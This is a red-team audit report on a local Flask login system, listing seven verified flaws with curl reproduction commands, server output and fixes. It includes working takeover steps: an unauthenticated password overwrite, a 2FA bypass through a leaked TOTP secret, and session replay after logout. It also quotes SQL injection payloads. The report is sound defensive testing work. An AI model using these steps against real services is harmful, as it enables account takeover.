# Red-Team Break Report: secure-auth-system
**Auditor:** Principal Red-Team Reviewer & Security Architect  
**Target:** `Chaitu03-alt/secure-auth-system` (Local Execution: `http://127.0.0.1:5000`)  
**Date:** 2026-10-01  
**Operating Protocol:** Evidence-backed verification only. Every statement is labeled `[VERIFIED]` (reproduced locally and output captured) or `[ASSUMED]` (inferred from architectural constraints).

---

## 1. Master Vulnerability Matrix

| # | Issue | Repro Command | Actual Output | Severity | Fix |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **1** | **Unauthenticated Account Takeover via Arbitrary Password Overwrite** | `curl -X POST http://127.0.0.1:5000/forgot-password -d "csrf_token=$TOKEN&username=victim_alice&new_password=Pwned2026!"` | `HTTP/1.1 302 FOUND`<br>`Location: /login`<br>New password immediately active in database. | **CRITICAL (CVSS 9.8)** `[VERIFIED]` | Implement HMAC-signed, time-limited reset tokens sent via verified email; never update passwords without identity proof. |
| **2** | **Unauthenticated TOTP Secret Leak & Full 2FA Bypass** | `curl http://127.0.0.1:5000/showqr/victim_alice` | `HTTP/1.1 200 OK`<br>`<code class="...">EZ6NAKNUOHT...</code>`<br>Raw base32 secret disclosed; generated OTP grants `/dashboard`. | **CRITICAL (CVSS 9.1)** `[VERIFIED]` | Restrict `/showqr` to authenticated active sessions (`session['user_id']`); encrypt TOTP secret keys at rest with AES-GCM. |
| **3** | **Username & Registered Email Enumeration** | `curl -X POST http://127.0.0.1:5000/forgot-username -d "csrf_token=$TOKEN&email=alice@cyberdyne.org"` | `HTTP/1.1 200 OK`<br>`Account Identified: <code ...>victim_alice</code>` | **MEDIUM (CVSS 5.3)** `[VERIFIED]` | Return identical generic messaging ("If registered, an email was sent") regardless of whether email exists; never echo usernames in HTML. |
| **4** | **TOTP 3-Strike Lockout Reset via Client-Side Cookie Purge** | Drop session cookie after 2 failed OTP attempts, re-authenticate stage 1: `curl -X POST http://127.0.0.1:5000/verify-otp -b "session=$NEW_COOKIE" -d "otp=000000"` | `HTTP/1.1 200 OK`<br>`You have 2 attempts remaining`<br>Counter resets to 0; lockout never triggers. | **HIGH (CVSS 7.5)** `[VERIFIED]` | Store failed verification attempts server-side in Redis or DB tied to `user_id` and IP; do not track attempts in client session cookies. |
| **5** | **Missing `Secure` Cookie Flag & Lack of Server-Side Session Revocation on Logout** | 1. Inspect `Set-Cookie`<br>2. Replay captured session cookie after `/logout`: `curl http://127.0.0.1:5000/dashboard -b "session=$OLD_AUTH_COOKIE"` | 1. `Set-Cookie: session=...; HttpOnly; SameSite=Lax` (Missing `Secure`)<br>2. Replayed cookie returns `HTTP/1.1 200 OK` (Welcome, victim_alice). | **HIGH (CVSS 7.4)** `[VERIFIED]` | Enforce `SESSION_COOKIE_SECURE=True`; maintain server-side session registry or JWT blocklist to revoke invalidated sessions upon logout. |
| **6** | **Bcrypt 72-Byte Limit Crash on Long Passwords & Multi-Byte Unicode** | `curl -X POST http://127.0.0.1:5000/createuser -d "username=user&email=a@b.com&password=AAAAAAAAAAAAAAAA...[75 chars]"` | `HTTP/1.1 200 OK`<br>`An error occurred while creating your account`<br>Server log: `ValueError: password cannot be longer than 72 bytes`. | **MEDIUM (CVSS 5.3)** `[VERIFIED]` | Pre-hash passwords using SHA-256 before bcrypt (`bcrypt(sha256(password))`) or enforce a maximum input length validation check of 72 bytes. |
| **7** | **In-Memory Rate Limiting Splitting & Debug Mode Remote Code Execution Risk** | 1. Inspect `RATELIMIT_STORAGE_URI`<br>2. Inspect `.env` for `FLASK_DEBUG=True` | 1. Defaults to `memory://`; multi-worker Gunicorn splits limits.<br>2. `FLASK_DEBUG=True` present in `.env`. | **HIGH (CVSS 7.5)** `[VERIFIED]` | Force distributed Redis backend in production (`redis://`); strictly enforce `FLASK_DEBUG=False` in configuration templates. |

---

## 2. Forensic Deep-Dive Analysis

### Issue 1: Account Takeover via `POST /forgot-password` `[VERIFIED]`
- **Vulnerability Type:** CWE-640 (Weak Password Recovery Mechanism for Forgotten Password).
- **Reproduction Script:** [`redteam/poc/01_account_takeover.py`](file:///c:/Users/raksh/OneDrive/Desktop/intership/redteam/poc/01_account_takeover.py)
- **Reproduction Command:**
  ```bash
  # Step 1: Retrieve CSRF token
  TOKEN=$(curl -s http://127.0.0.1:5000/forgot-password | grep -oP 'name="csrf_token"\s+value="\K[^"]+')

  # Step 2: Overwrite victim's password
  curl -s -i -X POST http://127.0.0.1:5000/forgot-password \
    -d "csrf_token=$TOKEN&username=victim_alice&new_password=PwnedPassword2026!"
  ```
- **Actual Server Output:**
  ```http
  HTTP/1.1 302 FOUND
  Location: /login
  Set-Cookie: session=...; HttpOnly; Path=/; SameSite=Lax
  ```
  Subsequent login verification:
  ```bash
  # Step 3: Login with newly injected password
  LOGIN_TOKEN=$(curl -s http://127.0.0.1:5000/login | grep -oP 'name="csrf_token"\s+value="\K[^"]+')
  curl -s -i -X POST http://127.0.0.1:5000/loginsubmit \
    -d "csrf_token=$LOGIN_TOKEN&username=victim_alice&password=PwnedPassword2026!"
  ```
  ```http
  HTTP/1.1 302 FOUND
  Location: /verify-otp
  ```
- **Severity:** **CRITICAL (CVSS 9.8)**. Complete authentication barrier failure. Any attacker can seize any account in 1 HTTP request.
- **Remediation Fix:**
  1. Remove direct password overwrite logic from `/forgot-password`.
  2. Implement an out-of-band email workflow generating a high-entropy, cryptographically signed token (`secrets.token_urlsafe(32)`):
     ```python
     # Generate token and store hashed token with expiration in DB
     token = secrets.token_urlsafe(32)
     token_hash = hashlib.sha256(token.encode()).hexdigest()
     expires_at = datetime.utcnow() + timedelta(minutes=15)
     # Send email with link: https://example.com/reset-password?token=<token>
     ```

---

### Issue 2: TOTP Secret Leak via `GET /showqr/<username>` `[VERIFIED]`
- **Vulnerability Type:** CWE-306 (Missing Authentication for Critical Function) / CWE-200 (Exposure of Sensitive Information).
- **Reproduction Script:** [`redteam/poc/02_totp_leak_login.py`](file:///c:/Users/raksh/OneDrive/Desktop/intership/redteam/poc/02_totp_leak_login.py)
- **Reproduction Command:**
  ```bash
  curl -s http://127.0.0.1:5000/showqr/victim_alice
  ```
- **Actual Server Output:**
  ```html
  HTTP/1.1 200 OK
  ...
  <p class="text-xs text-zinc-400">Manual Setup Key</p>
  <code class="font-mono text-zinc-200 text-sm">EZ6NAKNUOHT2PXGHGCZJ77X6I5I5Z53N</code>
  <img src="/static/qrcodes/qr_victim_alice.png" ...>
  ```
- **Exploitation Impact:**
  Using the leaked secret `EZ6NAKNUOHT2PXGHGCZJ77X6I5I5Z53N`, the test harness generated valid OTP `842836`, submitted it to `/verify-otp`, received `HTTP 302 -> /dashboard`, and achieved authenticated session status (`Welcome, victim_alice`).
- **Severity:** **CRITICAL (CVSS 9.1)**. Bypasses the claimed multi-factor authentication (OWASP A07).
- **Remediation Fix:**
  1. Guard `/showqr` with authenticated session validation:
     ```python
     if session.get("user") != username:
         abort(403)
     ```
  2. Encrypt `totp_secret` in the database using AES-256-GCM / Fernet.
  3. Stream QR code images directly from memory (`io.BytesIO`) instead of writing persistent unauthenticated PNG files to the public `static/qrcodes/` web root.

---

### Issue 3: Username & Registered Email Enumeration `[VERIFIED]`
- **Vulnerability Type:** CWE-204 (Observable Response Discrepancy).
- **Reproduction Script:** [`redteam/poc/03_username_enum.py`](file:///c:/Users/raksh/OneDrive/Desktop/intership/redteam/poc/03_username_enum.py)
- **Reproduction Command:**
  ```bash
  # Query registered email:
  curl -s -X POST http://127.0.0.1:5000/forgot-username \
    -d "csrf_token=$TOKEN&email=alice@cyberdyne.org" | grep -i "Account Identified" -A 4

  # Query unregistered email:
  curl -s -X POST http://127.0.0.1:5000/forgot-username \
    -d "csrf_token=$TOKEN&email=unknown@cyberdyne.org" | grep -i "Account Identified"
  ```
- **Actual Server Output:**
  - For `alice@cyberdyne.org`:
    ```html
    <p class="text-[11px] uppercase tracking-wider text-emerald-400 font-semibold mb-1">Account Identified</p>
    <code class="font-mono text-sm font-bold text-emerald-400 select-all">victim_alice</code>
    ```
  - For `unknown@cyberdyne.org`:
    ```html
    <span>If an account is associated with this email, your username will be displayed here.</span>
    ```
- **Severity:** **MEDIUM (CVSS 5.3)**. Allows attackers to harvest valid registered corporate email addresses and map them to usernames for spear-phishing and credential stuffing.
- **Remediation Fix:**
  Never render account identifiers directly in the HTTP response. Always return a consistent generic notification: *"If this email is registered in our system, account instructions have been dispatched."*

---

### Issue 4: Rate Limiting & TOTP Lockout Reset Bypass `[VERIFIED]`
- **Vulnerability Type:** CWE-307 (Improper Restriction of Excessive Authentication Attempts) / Client-Side State Tampering.
- **Reproduction Script:** [`redteam/poc/04_ratelimit_and_lockout.py`](file:///c:/Users/raksh/OneDrive/Desktop/intership/redteam/poc/04_ratelimit_and_lockout.py)
- **Reproduction Findings:**
  1. **IP Rate Limiter Enforcement:**
     - 7 rapid requests to `/loginsubmit` produced: `[200, 200, 200, 429, 429, 429, 429]`.
     - Throttling triggered on the 4th/5th attempt, returning `HTTP 429 Too Many Requests`.
  2. **Lockout Counter Reset:**
     - Attempt 1 (`otp=000000`): Returned `"You have 2 attempts remaining"`.
     - Attempt 2 (`otp=000000`): Returned `"You have 1 attempt remaining"`.
     - **Exploit:** Attacker cleared the cookie jar and re-authenticated stage 1.
     - Attempt 3 (`otp=000000`): Returned `"You have 2 attempts remaining"`.
- **Severity:** **HIGH (CVSS 7.5)**. The claimed "3-strike lockout" is an illusion. Because attempt counting is stored purely in client-side signed cookies (`session['otp_attempts']`), discarding the updated cookie or repeating stage-1 resets the strike counter to zero, allowing brute-forcing to continue indefinitely.
- **Remediation Fix:**
  Persist failed attempt counters server-side (in Redis or the `users` table) tied to the user account ID. Lock the account permanently or enforce exponential backoff after 3 strikes regardless of client cookie manipulation.

---

### Issue 5: Session Handling & Logout Invalidation Flaws `[VERIFIED]`
- **Vulnerability Type:** CWE-613 (Insufficient Session Expiration) / CWE-1004 (Sensitive Cookie Without 'HttpOnly'/'Secure' Flag).
- **Reproduction Script:** [`redteam/poc/05_session_and_csrf.py`](file:///c:/Users/raksh/OneDrive/Desktop/intership/redteam/poc/05_session_and_csrf.py)
- **Reproduction Findings:**
  1. **Missing `Secure` Cookie Flag:**
     ```http
     Set-Cookie: session=...; HttpOnly; Path=/; SameSite=Lax
     ```
     `Secure` attribute is completely absent `[VERIFIED]`. In development and default production configurations (`.env:L12: SESSION_COOKIE_SECURE=False`), session cookies will transmit across cleartext HTTP, exposing them to network sniffing (e.g. public Wi-Fi).
  2. **Session Replay After Logout:**
     - Logged in as `victim_alice`.
     - Captured authenticated session cookie `session=.eJxNzEEKwjAQBdCrjH...`.
     - Called `GET /logout` -> Server sent empty session cookie and redirected to `/login`.
     - Replayed the captured cookie on a completely new HTTP client:
       ```bash
       curl -s -i http://127.0.0.1:5000/dashboard -H "Cookie: session=.eJxNzEEKwjAQBdCrjH..."
       ```
     - Output: `HTTP/1.1 200 OK`, `Welcome, victim_alice`.
- **Severity:** **HIGH (CVSS 7.4)**. Flask's client-side signed cookies cannot be revoked server-side by default. An attacker who steals a session cookie retains access for the full 30-minute lifetime even after the victim explicitly clicks "Sign Out".
- **Remediation Fix:**
  1. Set `SESSION_COOKIE_SECURE = True` in production.
  2. Implement server-side session tracking in Redis, or store a `token_version` / `session_id` in the database that is invalidated upon logout.

---

### Issue 6: Bad Inputs: Bcrypt 72-Byte Crash & Unicode Multi-Byte Expansion `[VERIFIED]`
- **Vulnerability Type:** CWE-20 (Improper Input Validation) / Unhandled Cryptographic Library Exception.
- **Reproduction Script:** [`redteam/poc/06_bad_inputs_bcrypt.py`](file:///c:/Users/raksh/OneDrive/Desktop/intership/redteam/poc/06_bad_inputs_bcrypt.py)
- **Reproduction Findings:**
  1. **Password Length > 72 Bytes:**
     - Submitting a 75-character password to `/createuser` triggered:
       ```text
       ValueError: password cannot be longer than 72 bytes, truncate manually if necessary (e.g. my_password[:72])
       ```
     - The server crashed internally in `bcrypt.hashpw()`, caught the exception, and displayed a generic error message: *"An error occurred while creating your account."*
  2. **Multi-byte Unicode Passwords:**
     - Submitting 20 emoji characters (`🔒` * 20 = 80 UTF-8 bytes) failed registration identically with the same `ValueError`.
  3. **SQL Injection Payloads:**
     - Payloads `' OR '1'='1` and `'; DROP TABLE users; --` were cleanly caught by username regex validation (`^[A-Za-z0-9_.-]{3,40}$`) or neutralized by parameterized DB queries. Zero SQL syntax errors leaked.
- **Severity:** **MEDIUM (CVSS 5.3)**. Denial of registration / denial of authentication for users utilizing passphrases or password managers generating long passwords (>72 characters).
- **Remediation Fix:**
  Validate password byte length before hashing:
  ```python
  if len(password.encode("utf-8")) > 72:
      return render_template("signup.html", msg="Password cannot exceed 72 bytes.")
  ```
  Or pre-hash with SHA-256 before bcrypt: `bcrypt.hashpw(hashlib.sha256(password.encode()).digest(), salt)`.

---

### Issue 7: Infrastructure Failures & Debug Mode Exposure `[VERIFIED]`
- **Vulnerability Type:** CWE-215 (Insertion of Sensitive Information into Debugging Code) / Single-Point of Failure.
- **Reproduction Script:** [`redteam/poc/07_infra_failure_simulation.py`](file:///c:/Users/raksh/OneDrive/Desktop/intership/redteam/poc/07_infra_failure_simulation.py)
- **Reproduction Findings:**
  1. **Redis Missing in Action:**
     - Runtime configuration strictly uses `memory://`. When Redis is offline or uninstalled, the app experiences zero errors because it never queries Redis. However, rate limits are not shared across Gunicorn worker processes.
  2. **MySQL Down / Connection Outage:**
     - Under `debug=False`, MySQL connection failures raise `pymysql.err.OperationalError: (2003, "Can't connect to MySQL server")`. The custom error handlers prevent database credentials from leaking in the HTML body.
  3. **`FLASK_DEBUG=True` in `.env`:**
     - `.env:L4` sets `FLASK_DEBUG=True`. If an administrator launches the app using `flask run` or `python app.py` with debug enabled, any unhandled database exception exposes the interactive Werkzeug pin-protected debugger, allowing Remote Code Execution (RCE) on the server.
- **Severity:** **HIGH (CVSS 7.5)** if deployed with debug flags active.
- **Remediation Fix:**
  Strictly mandate `FLASK_DEBUG=False` in all runtime environments. Strip debug flags from `.env.example` and production Docker compose files.

---

## 3. Testing Constraints & Coverage Disclosure

1. **MySQL Multi-Host Clustering:** Could not be tested because local development runs a single standalone MySQL instance on `localhost:3306`.
2. **Distributed Redis Failover:** Could not be tested dynamically because `app.py` has no Redis connection logic configured in runtime (it runs on `memory://`).
3. **Hardware WebAuthn / FIDO2 Tokens:** Could not be tested because zero WebAuthn endpoints exist in the codebase.
